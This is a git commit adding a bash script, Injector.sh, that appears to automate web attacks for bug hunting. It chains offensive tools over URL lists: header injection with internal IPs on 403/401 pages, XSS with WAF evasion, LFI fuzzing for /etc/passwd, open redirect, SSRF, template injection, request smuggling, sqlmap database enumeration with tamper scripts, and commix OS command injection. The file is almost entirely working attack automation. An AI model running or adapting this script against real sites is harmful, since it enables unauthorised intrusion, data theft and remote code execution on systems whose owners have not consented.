26007ecd21f51454f2066b838629f1e1783fdf44
khaled yassen <79770764+khaledyassen@users.noreply.github.com>
2024-02-08 02:50:17 +0200

    Update and rename Param_Injection.sh to Injector.sh

---
+++ Injector.sh
@@ -0,0 +1,69 @@
+#!/bin/bash
+# Need to change the SSRF tool
+
+# Define the directory to check and the list of required files
+directory="."
+required_files=("httpx.txt" "XSS.txt" "LFI.txt" "Smuggler.txt" "SSRF.txt" "SSTI.txt" "SQL.txt" "OS_Commands.txt" "internal_CLoudEnum_IPs.txt")
+
+# Array to store missing files
+missing_files=()
+
+# Check if each required file exists in the directory
+for file in "${required_files[@]}"; do
+    if [ ! -f "$directory/$file" ]; then
+        missing_files+=("$file")
+    fi
+done
+
+# Check if any files are missing
+if [ ${#missing_files[@]} -eq 0 ]; then
+    echo "ok"
+    # head injection for 403&401
+    cat httpx.txt | grep "403" | cut -d " " -f1 | anew 403.txt
+    cat httpx.txt | grep "401" | cut -d " " -f1 | anew 403.txt
+    cat 403.txt | while read url; do headi -u $url -p internal_CLoudEnum_IPs.txt | anew output/403_Response.txt ; done
+    
+    # XSS injection
+    dalfox file XSS.txt --waf-evasion --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0' -o output/XSS_Inject_Response.txt;
+    sleep 3
+    
+    # LFI injection
+    cat LFI.txt | qsreplace FUZZ | while read url; do
+    ffuf -u $url -t 25 -mr "root:x" -w payloads_wordlist.txt -o output/LFI_Inject_Response.txt; done
+    sleep 3
+    
+    # Open Redirect
+    cd Oralyzer
+    python3 oralyzer.py -l ../SSRF.txt | anew ../output/Open_Redirect_Response.txt
+    cd ../
+    sleep 3
+    
+    # SSRF injection
+    cat SSRF.txt | qsreplace "Burp collaborator payload" | httpx --status-code -fr -o output/SSRF_Inject_Response.txt
+    sleep 3
+    
+    # SSTI injection
+    cd tplmap
+    cat ../SSTI.txt | while read url; do python3 tplmap.py -u $url | anew ../output/SSTI_Inject_Response.txt; done
+    cd ../
+    sleep 3
+    
+    # Smuggler injection
+    cd smuggler
+    cat ../Smuggler.txt | python3 smuggler.py | anew output/Smuggler_Response.txt
+    cd ../
+    sleep 3
+    
+    # SQL injection
+    sqlmap -m SQL.txt --level 3 --risk 1 --batch --dbs --tamper=between | anew output/SQL_Inject_Response.txt;
+    sleep 3
+    
+    
+    # OS command injection
+    cd commix
+    cat ../OS_Commands.txt | while read url; do python3 commix.py -u $url --hostname | anew ../output/Command_Inject_Response.txt; done
+    cd ../
+else
+    echo "Missing files:"
+    printf '%s\n' "${missing_files[@]}"
+fi
